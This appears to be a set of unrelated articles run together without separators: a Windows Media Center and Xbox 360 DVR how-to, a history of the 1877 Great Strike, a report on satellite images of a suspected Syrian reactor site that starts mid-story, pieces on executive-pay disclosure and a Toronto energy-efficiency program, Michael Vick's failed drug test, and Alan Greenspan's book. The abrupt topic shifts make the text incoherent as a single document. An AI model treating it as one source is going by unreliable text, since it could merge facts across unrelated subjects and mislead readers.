Click to viewIf you 've purchased a new Windows computer in the past few years that 's running Windows Media Center Edition or Vista Home Premium or Ultimate and you are n't taking advantage of its baked - in DVR Media Center software , it 's time we change that .
Why ?
Because after installing a $ 70 capture card in your computer and a bit of freeware third - party software , you 've got all the tools you need to record television shows on your PC 's built - in Media Center , extend that Media Center to your Xbox 360 , schedule recordings and stream TV over the internet .

Install a Capture Card
In order to record television on your media center PC , you need to be able to plug your coax cable into your computer .
For this purpose , God invented tuner cards — hardware you plug into your computer that handles all the heavy lifting of recording video .
If you do n't already have a capture card of some sort installed in your PC , this is the only monetary obstacle you 'll need to overcome .

It 's not really much of a hurdle , though , once you realize that capture cards are pretty cheap ( especially least compared with the cost of a TiVo ) and installing a PCI card inside your PC is an extremely simple process .
There are a lot of cards on the market , but I 've always had good luck with the Hauppauge cards , and you can score the Hauppauge PVR - 150 for just $ 70 .
If you really do n't want to crack open your PC , you 've still got options .
For around $ 125 , you can buy an external USB capture card , like this Hauppauge WinTV - PVR - USB2 , and just plug it into a USB port .

Either way , once you 've installed a capture card , all you need to do is fire up Windows Media Center ( XP or Vista edition ) and set it up with your new card .
The process is simple , and Windows will walk you through every step , so I wo n't go into details here .
Just know that when you 're done , you 'll be ready to schedule and record television TiVo - style on any basic PC .
Now it 's time to soup it up .
Use Your Xbox 360 as a Media Center Extender
Sure your computer is all set up for handling DVR duties , but it 's all the way over at your desk , and hell if you 're going to sit around the computer to watch TV — that 's why you 've got a living room .
But what 's that , you say ?
You 've got an Xbox 360 sitting in your living room ?
And it 's connected to your home network ?

Great !
That means you can actually use your Xbox to extend your Windows Media Center to your living room over your home network .
The result is a front - end to your Media Center that looks and feels exactly like your Windows Media Center running on the Xbox 360 you 've already integrated into your home theater .
Just point your Media Center PC to the Xbox 360 extender page and grab the appropriate download for your Media Center type and follow the simple setup instructions to set up your Xbox .

You can use your Xbox controls to navigate the Media Center menus , but you can also buy an Xbox - branded Universal Media Remote for as little as $ 12 $ 17 ( price increased $ 5 since yesterday ) .
Alternately , if you want to go all out , you can grab Logitech 's killer Xbox 360 universal remote .

One of the biggest drawbacks to using an Xbox 360 as a Media Center extender is that it does n't natively support playback for DivX and several other popular , non -MS video codecs .
However , using a freeware third - party program called Transcode 360 , you can stream just about any video to your Xbox 360 .

From your Xbox extender , just highlight the video , press Info on your remote , select More , and then Transcode .
Transcode 360 transcodes the video in faster - than - realtime speed , meaning that you should hardly notice the difference when you 're watching a video transcoded with Transcode 360 .

On September 18 , 1873 , the country experienced a financial panic so severe that Wall Street closed for 10 days .
By 1875 , 18,000 businesses had failed and the unemployment rate had risen to 14 % .
For America the mid-1870's was still very early in the Industrial Revolution .
There was no social safety net , so when the breadwinner lost his job the whole family went hungry .
While industry was growing and expanding , the workers rights movement was still in its infancy .
Craft unions only represented 1 % of the workforce .
The first attempt at a national union had been a complete bust .
Even after the economic downturn ended businesses cut wages , and cut wages some more , and kept cutting them , and there was nothing the working man could do about it .
Wages had been cut by as much as 45 % and most employees were working part time .
The new industries showed little respect for working people .
Many paid the workers in company script which could only be redeemed at company stores while requiring the workers to live in company housing .
Working 10 hours a day , six days a week was the norm .
The new industrial machines were dangerous and the courts would rarely favor lawsuits for injuries sustained .
The Robber Barons of the day justified it with Social Darwinism .
This environment needed only a spark to have an explosion .
The Great Strike of 1877
The Great Strike was unprecedented for many reasons .
It was the first nationwide strike .
It saw the first general strikes in America .
It was far larger than any strike before it , and rarely matched in size after it .
But the biggest difference was that it was the only national strike in American history that was n't led by a labor union .
In fact , labor union members were a minority of the strikers .
Instead of being simply a strike by a labor union against a certain company about specified grievances , the Great Strike resembled a general working class revolt against the establishment .
It was leaderless and uncoordinated , and for that reason it was also probably the most violent strike in American history .
Nothing in America was ever the same after the Great Strike .
Even before the Great Strike had started there was labor trouble .
Pennsylvania Railroad slashed wages by another 10 % in June of 1877 , while doubling the size of trains going east without adding any additional crew .
Angry railroad workers stopped the trains in protest .
Management decided to preempt a strike and started firing unionized workers .
No sooner had these measures for economy in the company 's management gone into effect , than the class , and only the class — utterly worthless employees — to , began their secret meetings and their seditious efforts .
The following month , on July 11 , 1877 , the Baltimore & Ohio Railroad copied Pennsylvania and cut wages by 10 % while reducing the workweek by at least a day .
It was the second pay cut of the year for B&O .
At Martinsburg , West Virginia , the workers had had enough .
On July 16 firemen and brakemen refused to work .
The company tried to bring on replacements — many experienced men were unemployed because of the depression — but the strikers assembled at Camden Junction , three miles from Baltimore , would not let trains run in any direction .
The word quickly spread to Martinsburg , W. Va. , where workers abandoned their trains and prevented others from operating them .
The railroad company appealed to the governor , who called out the militia .
Militiamen and workers exchanged gunfire .
The scabs ran off , the militia withdrew — and the strikers were left in control of their idled trains .
Trains idle at Martinsburg
The national guard refused to use deadly force against other West Virginia citizens .
As word of the strike spread , so did the strike itself .
Soon trains were n't moving in Wheeling and Parkersburg .
The governor 's hand was forced and he called for federal troops .
New Republican President Hayes immediately responded to the call , and for the first time in this country 's history federal troops were about to be used to break up a labor dispute .
At Martinsburg , federal troops armed with Gatling guns managed to drive off the strikers with a show of force .
13 locomotives were released and trains began moving again ... for the moment .
Meanwhile the strike had spread to Baltimore where it became more violent .
The strike was far from over .
" Indeed , it was barely begun .
As fast as the strike was broken in one place it appeared in another . "
- Harper ’s Weekly
Soon the strike had spread to western Pennsylvania , Kentucky and Ohio .
No longer was this about B&O .
It was about all railroad companies , and soon it was about even more than that .
Maryland 's governor called out his own militia .
Within a half hour of the call , " a crowd numbering at least 2,000 men , women , and children surrounded the [ Maryland Sixth Regiment ] armory and loudly expressed their feelings against the military and in favor of the strikers , " according to Harper ’s Weekly .
The crowd added bricks and stones to the curses hurled against the armory .
The police were powerless .
Once the troops emerged for their march to Camden Station , shots were fired — and shots were exchanged .
6th Regiment fights its way through Baltimore
The militia killed 11 and wounded 40 , both strikers and onlookers .
Half of the 120 troops quit almost immediately .
The rest marched to the Camden Station where they engaged the strikers in a running battle .
By that time nearly 15,000 strikers and supporters had arrived at the station .
The governor asked for federal troops , which sent five hundred regular army troops and calmed the situation down .
Strikes were occurring almost every hour .
The great State of Pennsylvania was in an uproar ; New Jersey was afflicted by a paralysing dread ; New York was mustering an army of militia ; Ohio was shaken from Lake Erie to the Ohio River ; Indiana rested in a dreadful suspense .
Illinois , and especially its great metropolis , Chicago , apparently hung on the verge of a vortex of confusion and tumult .
St. Louis had already felt the effect of the premonitory shocks of the uprising .
- St. Louis Republican , 1877
The Battle of Pittsburgh
Baltimore was a moderately pro-union city , but Pittsburgh 's union roots ran much deeper .
The local police and militia openly sided with the strikers .
According to Harper 's Weekly , even local businessmen sided with the strikers .
The strike in Pittsburgh can be traced to one man - a flagman named Gus Harris .
Harris refused to go out on a " double - header , " a train with two locomotives carrying a double length of cars , to which railroaders had objected because it required fewer workers and made the brakemen ’s work more dangerous .
The decision was his own , not part of a concerted plan or a general understanding .
When Harris said he would not go , the rest of the crew refused too .
The strikers now multiplied , joined by young boys and men from the mills and factories ( Pittsburgh had 33 iron mills , 73 glass factories , 29 oil refineries , 158 coal mines ) .
The freight trains stopped moving out of the city .
The Trainman ’s Union had not organised this , but it moved to take hold , called a meeting , invited " all workingmen to make common cause with their brethren on the railroad . "
Local authorities were forced to call on the Philadelphia militia for help in breaking the strike , who did n't arrive until July 21 .
" [ Strikers should be given ] a rifle diet for a few days and see how they like that kind of bread . "
- Thomas Alexander Scott , President of Pennsylvania Railroad , 1877
When the Philadelphia militia arrived at the Pittsburgh train station they were met by thousands of men , women and children , and a " shower of stones " .
Some of the events are disputed but two facts are certain : 1 ) the angry mob was mostly unarmed , and 2 ) the militia fired volley after volley into the crowd without discriminating the victims .
" The sight presented after the soldiers ceased firing was sickening , " reported the New York Herald ; the area " was actually dotted with the dead and dying . "
Official estimates were 20 men , women and children dead , 29 wounded .
But those numbers are probably understated because some relatives carried away their dead and wounded loved - ones .
The high percentage of dead shows that the militia did n't " accidentally " shoot anyone .
Normally at this point the story ends .
The military committed their atrocity on the civilians .
The civilians would cower in their homes .
A few ringleaders would be given kangaroo court trials and then publicly hung .
Some government official would express " sympathy " , and the media would accept it all and then forget about it .
However , this is n't one of those times .
" Shot in Cold Blood by the Roughs of Philadelphia .
The Lexington of the Labor Conflict at Hand .
The Slaughter of Innocents . "
- Newspaper headline , 1877
When word of the massacre reached the nearby mills and manufacturing shops , the workers there poured out into the streets .
Some broke into a gun factory .
" Miners and steel workers came pouring in from the outskirts of the city and as night fell the immense crowd proved so menacing to the soldiers that they retreated into the roundhouse . "
- Harper 's Weekly
Instead of facing a few thousand rock - throwing women and children , the troops were now facing an entire armed city .
Instead of a city wanting them to leave , they now wanted them all dead .
By midnight the railroad roundhouse that the militia had retreated to was surrounded by 20,000 angry men , about 5,000 of them armed .
This was n't what the President of Pennsylvania Railroad had in mind when he talked about a " rifle diet " .
In fact , the situation was totally out of control of the authorities .
Workers and soldiers exchanged rifle fire all night long .
At one point the workers nearly set the roundhouse on fire by sending a blazing oil car hurtling against a nearby building .
If that had happened there was little chance that any of the militia would have survived the night .
" [ It was ] a night of terror such as last night I never experienced before and hope to God I never will again . "
- New York Herald , told by a Civil War veteran , member of the militia
The next morning the troops realized that help was not going to come in time .
If they were to live they had to save themselves .
They marched out of the roundhouse firing in all directions .
Their fire was returned .. from everywhere .
A legislative report said that the National Guard forces " were fired at from second floor windows , from the corners of the streets ... they were also fired at from a police station , where eight or ten policemen were in uniform . "
The troops literally ran out of town under fire .
Along the way they managed to kill about 20 more people , while four of the troops were killed along the way , their bodies left behind because anyone who stopped would die .
The militia was sniped at for nearly a dozen miles outside of Pittsburgh .
Meanwhile the angry mob took their rage out on the railroad station .
They set fires that razed 39 buildings and destroyed 104 locomotives and 1,245 freight and passenger cars .
The entire city had come to a complete halt as the nation 's first general strike took hold .
The destruction of the depot
Roundhouse after the fire
For nearly a month the city of Pittsburgh was outside of the control of state and federal authorities .
Elsewhere in Pennsylvania
The workers of Reading Railroad were not a happy bunch .
Their pay was in arrears by two months .
On July 22 , a crowd of workers and their families had gathered at the Reading train station and blocked traffic .
In a near exact copy of previous clashes , the railroad called out the national guard .
The crowd threw stones at the troops and the troops responded by shooting wildly into the crowd , killing 10 and wounding 40 , including 5 local police .
" Six men lay dead in the twilight , " Bruce reports , " a fireman and an engineer formerly employed in the Reading , a carpenter , a huckster , a rolling - mill worker , a labourer A policeman and another man lay at the point of death . "
The crowd did not leave , but grew more menacing .
At which point the troops lost heart .
They stacked their guns and swore not to fire .
Some handed their weapons and ammo to the crowd .
They were allowed to leave .
The same evening in Sunsbury word got out that a national guard unit would pass through on its way to Pittsburgh to crush the strike there .
A crowd gathered at the railroad junction at 3rd and Chestnut streets to stop it .
When the train came into town the crowd overran the train , took it over , and sent it back in the direction it came .
In Danville on the morning of July 23 , the workers appointed a group to ask the Commissioner of the Poor for bread or work .
The Commissioner " passed the buck " to the mayor .
At 3 PM a large crowd gathered at the weigh scales on Mill Street in the middle of Danville .
One speaker said " We will give the borough authorities until tomorrow at 10:00 to devise some action to give us work or bread .
If at that time nothing is done for us , we will take [ explicative ] wherever we can find it . "
The next day there was almost a bread riot .
Citizens were on the verge of starvation . [...]
One policeman tried to arrest Treas , for using incendiary language .
But he could not get to Treas in the crowd .
Following these events , the authorities gave food to those in need .
Meanwhile back in Reading a protest on the 25th got out of control and looted the Reading Railroad station .
" Mayor William Douty gathered vigilantes outside City Hall in response to a prearranged signal - a bell ringing at the Presbyterian church where he belonged . "
Douty had already made himself famous by being a coal mine owner who persecuting the Molly Maguires .
Douty 's vigilantes shot into the crowd , wounding 12 and killing two .
Neither of the two killed were members of the rioters .
A Mr. Weist was shot dead while closing his candy store .
In Lebanon , Pennsylvania , one militia unit mutinied .
In Altoona , a national guard unit found itself surrounded by rioters and disabled engines , simply surrendered .
The rioters gave them water and sent them home accompanied by a singing quartet .
When that unit made it back to Philadelphia they were met by a much larger group of rioters who took their guns away and marched them through the street like prisoners of war .
They were fed at a hotel and then sent home .
Believe it or not , most railroad unions were not supporting the strike .
The Order of Railway Conductors , the Brotherhood of Locomotive Firemen , the Brotherhood of Engineers , disavowed the strike .
While the Philadelphia militia was fighting for its life against the strikers in Pittsburgh , the working men and women of Philadelphia was supporting the cause of the strikers .
Strikers and rioters engaged the militia in street battles .
Much of the City Center suffered fire damage before federal troops arrived and put down the riots .
Further to the west
" All you have to do , gentlemen , for you have the numbers , is to unite on one idea — that the workingmen shall rule the country .
What man makes , belongs to him , and the workingmen made this country . "
- strike speaker in St. Louis , 1877
The strike hit its peak when it reached Illinois .
On July 21 , all railroad traffic through St. Louis was halted by the strikers .
In a show of support , a general strike was called by the Workingmen 's Party and the entire city simply shut down for a full week .
At one of its huge meetings , writes Marieke van Ophem , " a black man was the voice for those who worked on the steamboats and levees .
He asked : ‘ Will you stand to us , regardless of color ? ’
The crowd shouted in response : ‘ We will ! ’ "
Only around St. Louis did the original strike on the railroads expand into such a systematically organized and complete shut - down of all industry that the term general strike is fully justified .
And only there did the socialists assume undisputed leadership .
. . . no American city has come so close to being ruled by a workers ’ soviet , as we would now call it , as St. Louis , Missouri , in the year 1877 .
- David Burbank
Despite a lack of violence , the city was put under martial law .
Strike leaders were thrown in jail without charges or a trial .
Federal troops , combined with company thugs , put an end to the strike , much like everywhere else .
Chicago was n't so lucky .
The last major city to join in the strike , Chicago workers were met with the most deadly , official violence .
On July 24 , rail traffic in Chicago was paralyzed when angry mobs of groups of unemployed citizens wreaked havoc in the rail yards , shutting down both the Baltimore and Ohio and the Illinois Central Railroads .
Soon , other railroads were brought to a standstill , with demonstrators shutting down railroad traffic in Bloomington , Aurora , Peoria , Decatur , Urbana and other rail centers throughout Illinois .
In sympathy , coal miners in the pits at Braidwood , LaSalle , Springfield , and Carbondale went on strike as well .
The Workingmen 's Party had a large base in Chicago and one of its leaders was a man named Albert Parsons .
Parsons was fired from the Chicago Times the day after he spoke at the huge Workingmen 's rally on July 24 , which drew 20,000 people .
Albert Parson was martyred a decade later by being hung for his participation in the Haymarket Square Riot , despite the fact that he was n't even in Haymarket Square at the time of the riot .
The mayor of Chicago , Monroe Heath , asked for 25,000 vigilantes to put down the strike .
Together with the police , they attacked the crowds .
" The sound of clubs falling on skulls was sickening for the first minute , until one grew accustomed to it .
A rioter dropped at every whack , it seemed , for the ground was covered with them . "
Two companies of U.S. infantry arrived , joining National Guardsmen and Civil War veterans .
Police fired into a surging crowd , and three men were killed .
The next day , an armed crowd of 5,000 fought the police .
The police fired again and again , and when it was over , and the dead were counted , they were , as usual , workingmen and boys , eighteen of them , their skulls smashed by clubs , their vital organs pierced by gunfire .
Aftermath
Somewhere between 80,000 and 200,000 workers had participated in the Great Strike .
Between 100 and 200 had died , almost all of them at the hands of authorities .
About 1,000 strikers were arrested .
The strike from beginning to end lasted about 45 days .
The results of the strike were mixed .
Some railroad company wage cuts were rescinded .
Some worker safety issues were addressed .
But the bosses also took steps to not let the workers gain the upperhand again .
Many states enacted conspiracy statutes .
New national guard units were formed , with armories constructed in many cities ( usually with loopholes for guns ) .
Business leaders took a rigid stance against unions , and in response to that rigid stance , unions kept growing .
However , the workers learned important lessons as well .
One lesson was that they in fact had the power to bring everything to a halt if they so chose .
They also learned that strike organization was vital to win concessions for the workers .
This strike led directly to the rise of national unions , as well as decades of violent labor conflict that would n't completely end until workers rights were enshrined into federal law under FDR .
Gordon D. Johndroe , a White House spokesman , declined to comment on the satellite pictures .
A reactor of the size of what analysts believe Syria was building would have been able to make enough plutonium to fuel about one nuclear weapon a year .
But removing the plutonium from spent fuel rods would require a reprocessing facility for which analysts have reported no evidence .
Satellite images of the Syrian site were released by DigitalGlobe , in Longmont , Colo. , and SPOT Image Corporation , in Chantilly , Va .
They show a smooth , unfurrowed area where the large building once stood .
“ It ’s clearly very suspicious , ” said Joseph Cirincione , an expert on nuclear proliferation at the Center for American Progress in Washington .
“ The Syrians were up to something that they clearly did n’t want the world to know about . ”
Mr. Cirincione said the photographic evidence “ tilts toward a nuclear program , ” but did not prove that Damascus was building a reactor .
Besides , he said , even if Syria was developing a nuclear program , it was still years away from being operational and thus not an imminent threat .
The desolate Syrian site is situated on the eastern bank of the Euphrates River some 90 miles north of the Iraqi border and seven miles north of the desert village of At Tibnah .
An airfield lies nearby .
The new images , in addition to revealing the removal of the tall building , show still standing a secondary structure and what could be a pumping station on the Euphrates .
Analysts suspect the pumping station was for cooling the reactor .
The building was said by analysts to have been modeled on a design used by the North Koreans , whose building is a few feet larger that the Syrian building that vanished .

NOW there is nowhere for the bosses of corporate America to hide their bulging pay packets .
In spite of years of defensive lobbying , they are having to reveal all under new Securities and Exchange Commission ( SEC ) rules that have just begun to take effect .
This burst of sunlight could not have come at a worse time for them .
It coincides with a shift in the control of Congress to the Democrats and the start of the presidential election campaign , in which “ overpaid ” chief executives will make an easy target .
Although barely one - tenth of the 2,000 biggest American companies have yet reported under the new rules , the tally of negative headlines is already mounting .
“ There are already plenty of examples of firms reporting chief - executive pay packages of millions of dollars more than expected , ” says Paul Hodgson of the Corporate Library , a research firm .
He reckons that the firms that have already reported are a representative sample likely to provide a good indication of the overall trend .
Top of the heap so far is Ken Lewis , boss of Bank of America , with total pay in 2006 valued at $ 114.4 m .
One area of generosity is the chief executive 's future pension .
Another is “ deferred pay ” , whereby a top executive leaves some part of his salary in the hands of the firm , as a loan of sorts .
GE recently reported that Robert Wright , until recently the boss of NBC Universal , its entertainment subsidiary , has accumulated deferred pay worth $ 40 m , the highest so far .
Quite why a boss or firm should want to resort to this tactic has never been clear , although the suspicion has always been that the firms are offering managers unusually good returns at the shareholders ' expense .
Now the details of these arrangements are being published for the first time , so it will become clear whether that was so .
In a study of 100 firms that have reported , Mr Hodgson found that the perks given to chief executives , though relatively small , were much higher than those reported last year under the old , less exacting , disclosure rules .
On average , the amounts reported in 2006 under the heading “ other annual compensation ” in 2006 were $ 192,000 — 131 % higher than in the corresponding category in 2005 .
One reason for this jump was that the new rules require the disclosure of all perks worth $ 10,000 or more , whereas the old rules allowed firms to keep quiet about anything worth less than $ 50,000 .
Of particular interest will be the data on personal use of the corporate jet .
This is expected to decline sharply as firms start to charge the boss for personal flights in order to avoid embarrassing headlines .
No company wants a repeat of the battering suffered by Tyson Foods after revelations that “ friends and family ” of Donald Tyson , a former boss , made undisclosed use of the corporate jet — valued at over $ 1 m — without his even being on board .
Another likely target is the golden parachute for a departing boss , especially if he has left because of poor performance .
This is increasingly a focus of activist shareholders , including hedge funds .
On March 20th John Antioco , the boss of Blockbuster , a video - rental firm , announced that he would resign by the end of the year .
Following a long battle over his bonus with Carl Icahn , a legendary corporate raider , he agreed to accept much less in severance than he had said he was entitled to under his contract .
The directors ' cut
Boards have already started to pay greater attention to how they set the chief executive 's pay and to being seen to do so in a way that serves the interests of shareholders .
One reason is the requirement that compensation committees consist entirely of independent directors , introduced as a listing requirement by the New York Stock Exchange in the wake of the corporate scandals at the start of the decade .
These committees must now hire compensation consultants , and many are insisting that they do no other work for the company .
Previously , compensation consultants typically had other lucrative contracts , which may have swayed their judgment .
The new climate surrounding pay has already had an effect .
Base salary has stabilised , though it was never the fastest - growing part of pay .
Options , which even before the recent backdating scandal were losing their appeal , have been partly replaced by performance - related pay .
“ Boards are being tougher with new hires , in particular , as it is hard to get a sitting chief executive to give up pay promised in his contract , at least without compensation , ” says Russell Miller of Korn Ferry , a recruitment firm .
Even being tough on new chief executives is not proving easy , however .
Boards know that the choice of a boss can have a huge impact on a firm 's performance .
Executive talent is valuable .
Private equity is on the prowl , offering packages with incentives that a public company can find hard to match amid all the denunciation of fat cats .
Those are good reasons to expect pay to continue to grow , in spite of the outrage .
Not everybody is happy with the quality of the disclosures made so far .
One issue is the length and complexity of the statements , which often run to 30 pages or more of opaque legalese .
There are also complaints that the single number for total pay required by the SEC is misleading .
“ There is more than one honest answer to the question , ‘ How much did you pay the chief executive ? ' ” says Joe Grundfest , a former SEC commissioner who is now at Stanford University .
The SEC requires firms to combine both the actual pay bosses receive each year and an estimate of the value of future performance - related pay , such as share options , which is calculated using a formula known as Black - Scholes .
But the value of such options changes along with the firm 's share price — they could even prove to be worthless .
“ The one certainty is that the option grant will not turn out to be worth the Black - Scholes valuation , ” says Mr Grundfest .
Which is why the SEC should require two totals to be published , argues Ira Kay of Watson Wyatt , a compensation consultancy .
As well as saying what managers might earn , they should estimate what they have earned .
Unlike the SEC 's number , such “ total realised pay ” correlates well with firms ' performance , says Mr Kay .
Such subtleties may not matter much to the headline writers .
Outraged politicians in Washington , DC , smell blood .
Barney Frank , chairman of the House financial services committee , is proposing legislation to require companies to seek the ( non- binding ) approval of shareholders for executive pay packages each year .
There may also be moves to toughen the tax treatment of executive pay , perhaps by removing tax benefits for performance - related compensation , at least above a certain level , says David Yermack , an economist at New York University .
Share options and pensions may also come under fire .
Given the growing number of middle - class Americans who have to pay the higher alternative minimum tax , Congress may feel that heavier taxes for corporate bosses have populist appeal .
“ Anything is possible in this climate , ” says Mr Yermack , “ so bosses may need to get used to the idea that more of their compensation will be subject to taxation . ”
At least they can afford it .
Toronto resident Virginia
King felt something had to be done when it came to her $ 400 - a- month electric bills .
So she called Toronto Hydro and found out she qualified to participate in the low - income energy efficiency home assistance program funded by the Ontario Power Authority .
King 's home is one of 270 homes heated by electricity in Toronto and Peel that qualify for the program operated by Green$aver , a non-profit organization that runs energy audits of homes and then implements its recommendations .
Ontario Power Authority has provided $ 2.9 million in funding .
It 's all part of a pilot project that provides energy assessments , customized energy efficiency tips and upgrades , as well as the replacement of inefficient refrigerators with an Energy Star rated unit .
The non-profit organization is also doing a similar project with Enbridge .
To qualify for the program , the total household income , including EI benefits , must not exceed between $ 32,000 and $ 45,000 , depending on the number of people in the household .
Residents can also qualify if a member of the household participates in low - income support programs such as Ontario Works , Ontario Disability Support Program or Guaranteed Income Supplement for Seniors .
Residents must also live in a privately owned house .
They can be homeowners or tenants , but must also pay their own electrical or gas bill .
Surprisingly , 30.7 per cent of the lowest - income households in Ontario use electrical energy to heat their homes compared to 14.4 per cent for average - income households .
According to Green$aver , those on low incomes often spend 11 per cent of annual income on heat and electricity compared to 4 per cent in average households .
When it came time for King 's energy assessment , she was surprised by the results .
She was already using mostly energy efficient light bulbs and it was recommended that she get four more .
The house was tested for leaks and drafts and found to be pretty tight , but a new fridge , which would save her about $ 80 a year , was in order .
The energy auditor also suggested her landlord repair the way the dryer vented exhaust fumes in her basement and that an electrician check the wiring .
Other suggestions included the use of a power bar for major appliances like a computer and television .
She was told to turn off the power bar when she was n't using the equipment to save energy .
The big plus for King was a new energy - saving fridge provided by the Low Income Energy Efficiency Program at no cost to her .
While King , her husband and family were hoping for bigger savings , she believes every little bit counts when it comes to the environment and her bank account .
" I think it 's great .
It was the only program that was willing to come in and help . "

RICHMOND , Va. -- Michael
Vick is now likely one misstep from jail .
The disgraced Atlanta Falcons quarterback tested positive for marijuana earlier this month , a violation of the conditions of his
release as he awaits sentencing in federal court on a dogfighting charge that already jeopardizes his freedom and career .
Now , he 's incurred the ire of the judge who could sentence him to up to five years in prison in the dogfighting case .
On the day
of Vick 's guilty plea , U.S. District Judge Henry Hudson warned that he would n't be amused by any additional trouble .
Hudson , who will sentence Vick on Dec. 10 , on Wednesday ordered him confined to his Virginia home between 10 p.m. and 6 a.m. with electronic monitoring .
He also must submit to random drug testing .
If Vick fails another drug test , he likely will wind up like co-defendant Quanis Phillips -- incarcerated since his Aug. 17 plea
hearing .
Phillips failed a drug test when he had the electronic monitoring and random drug testing requirements .
Vick 's positive urine sample was submitted Sept. 13 , according to a document by a federal probation officer that was filed in U.S .
District Court on Wednesday .
Because Vick violated the conditions of his release , Hudson
could take that into consideration during sentencing , said Linda Malone , a criminal procedure expert and Marshall - Wythe Foundation professor of law at the College of William and Mary .
" Every judge considers pretty seriously if they feel that the defendant has flaunted the conditions for release , " she said .
" It 's certainly not a smart thing to do . "
Especially not when his behavior is being watched so closely , not only by the court that allowed him to remain free , but by the
public whose forgiveness he 's seeking .
In Atlanta , Vick 's one - time teammates tried to distance themselves from his latest troubles .
" That 's the last thing I 'm worried about , " linebacker Keith Brooking said at the Falcons ' suburban practice facility .
" We're
0 - 3 . We 're trying to get a win . "
Safety Lawyer Milloy agreed .
" I just want to play ball , " he said .
" I 'm so tired of talking about everything else , stuff we can't control that has nothing to
do with us . "
The failed drug test is just the latest legal trouble for the 27 - year - old Vick .
On Tuesday , Vick was indicted on state charges of beating or killing or causing dogs to fight other dogs and engaging in or
promoting dogfighting .
Each felony is punishable by up to five years in prison .
His arraignment on that is set for Oct. 3 .
The former Virginia Tech star was placed under pretrial release supervision by U.S. Magistrate Dennis Dohnal in July .
The restrictions included refraining from use or unlawful possession of narcotic drugs or other controlled substances .
The random drug testing ordered Wednesday could include urine
testing , the wearing of a sweat patch , a remote alcohol testing system or any form of prohibited substance screening or testing .
Hudson 's order also requires Vick to participate in inpatient or
outpatient substance therapy and mental health counseling if the pretrial services officer or supervising officer deem it appropriate .
Vick must pay for the treatment .
" This is a very difficult time for Mr. Vick , " Vick 's attorney ,
Billy Martin , said in a written statement .
" He will comply with the court 's new conditions regarding release . "
In January , Vick was cleared by police of any wrongdoing after his water bottle was seized by security at Miami International
Airport .
Police said it smelled of marijuana and had a hidden compartment that contained a " small amount of dark particulate . "
Lab tests found no evidence of drugs , and Vick explained that he used the secret compartment to carry jewelry .
The federal dogfighting case began in late April when authorities conducting a drug investigation of Vick 's cousin raided
the property Vick owns in Surry County and seized dozens of dogs , most of them pit bulls , and equipment associated with dogfighting .
Vick initially denied any knowledge of the enterprise , then
pledged after he was charged that he would fight to clear his name .
After Phillips and two other co-defendants pleaded guilty , Vick followed suit and admitted in a written plea to bankrolling the
enterprise and helping to kill eight dogs that performed poorly .
Vick was the only defendant not placed on electronic monitoring at the arraignments because he was the only one with no criminal record , the U.S. Attorney 's office said .
Greenspan : Higher inflation to warrant double - digit rates in future
The former Fed Chairman warns that interest rates will have to be raised .
WASHINGTON -- Former Fed Chairman Alan Greenspan predicts in a new book out Monday that the Fed will have to raise interest rates to double - digit levels in coming years to thwart inflation .
Greenspan , 81 , says in The Age of Turbulence that the inflation - damping effect of globalization , which has led to lower wage pressures , inflation and interest rates worldwide , will recede .
At some point , the flow of people into the workforce in developing countries such as China , which has seen a movement of workers from farms into factories , will slow , leading to stronger wage pressures and prices , he says .
The impact will be global .
And the shift " may be upon us sooner rather than later , " he says .
Evidence : Prices of Chinese imports coming into the USA started rising earlier this year .
That suggests that in the " next few years , " inflation will build unless action is taken .
The Wall Street Journal first reported details of the book on its website Friday night , saying it had bought a copy of the book in a New York City - area bookstore .
USA TODAY had received a copy of the book to review in advance and was given permission to run its story ahead of the official publication Monday .
Greenspan 's prediction comes shortly before Fed officials are widely expected to cut interest rates for the first time in more than four years following turmoil in mortgage markets that has rippled through the entire financial sector , leading to concerns about a credit crunch and a slowdown in the overall economy .
Fed Chairman Ben Bernanke and his colleagues , who meet in Washington Tuesday , have kept their target for short - term interest rates , which influence borrowing costs economywide , at 5.25 % for more than a year .
Greenspan 's assertion that the Fed may have to double rates from current levels suggests the Fed may put itself in a bind by cutting rates now .
Criticism of Bush over spending
In his 531 - page book , the former Fed chairman sharply criticizes President Bush for not vetoing bloated spending bills and for continuing to focus on issues , such as adding prescription drug benefits to Medicare even though the budget surplus of just a few years ago had disappeared and deficits were mounting .
" In the revised world of growing deficits , the goals were no longer entirely appropriate , " Greenspan says .
" He continued to pursue his presidential campaign promises nonetheless . "
Greenspan , a libertarian Republican , as he calls himself , was also disappointed that his former colleagues from the Ford administration who were working for Bush , including Vice President Dick Cheney , did n't show greater fiscal discipline .
" People 's ideas — and sometimes their ideals — change over the years , " Greenspan writes .
" I was a different person than I had been when first exposed to the glitter of the White House a quarter of a century before .
So were my old friends : not in personality or character , but in opinions about how the world works and , therefore , what is important . "
The Bush administration has often attributed the deficits to the impact of the 2001 recession , September 11 , the war on terror and corporate scandals .
" We are not going to apologize for spending that was required for national security and fighting the war on terror , " White House spokesman Tony Fratto says .
" We respect the work that Chairman Greenspan did , " Fratto says .
" We always respect his opinion .
We share his views on limiting fiscal deficits .
Once we were able to help the economy recover , it 's clear that growth and limited spending are resulting in diminished deficits that will lead us to surpluses . "
Greenspan also does n't spare Republicans in Congress , who he says were " feeding at the trough , " passing expensive pet projects for their home districts .
For this , he says , they " deserved to lose " control of Congress to the Democrats in 2006 .
" The Republicans in Congress lost their way , " he says .
" They swapped principle for power .
They ended up with neither . "
Greenspan covers a number of his pet topics , many of them familiar to those who have been following the former chairman 's speeches and testimony .
He argues U.S. primary and secondary education is slipping and must be reformed quickly to reduce income disparities between the skilled and unskilled , says trade protectionism can only hurt the economy and advocates looser immigration policies to provide more skilled workers .
He also frets about probably his biggest concern :
The retirement of the baby boomers and the impending fiscal problems caused by the draws on Social Security and Medicare .
He considers it an urgent problem that needs to be addressed soon .
A personal look at his life
Greenspan starts the book out on September 11 , 2001 , winding back to his childhood and eventually going into detail about his time at the Fed .
He includes details of his relationship with wife , Andrea Mitchell .
After their first date he invited her back to his apartment to read an economics paper he had written .
And they 've been together ever since .
" I 'm not threatened by a powerful woman ; in fact , I 'm now married to one , " Greenspan says , when discussing TV newswoman Barbara Walters , whom he dated after meeting in 1975 .
" The most boring activity I could imagine was going out with a vacuous date — something I learned the hard way over my years as a bachelor . "
Greenspan gives readers a look into a man everyone knows but few know a lot about .
One million copies of the book have been made in the initial printing .
Although he delves into a variety of economic topics , it is the personal part that is likely to be the most interesting , even for those who have followed the former Fed chief for decades .
He discusses how his parents ' divorce " left a big hole " in his life , even though he remained in touch with his dad , Herbert , who was a broker on Wall Street .
Later , of his divorce to his first wife , Joan Mitchell , Greenspan says , " I was the main problem , " arguing he married a good woman for the wrong reasons .
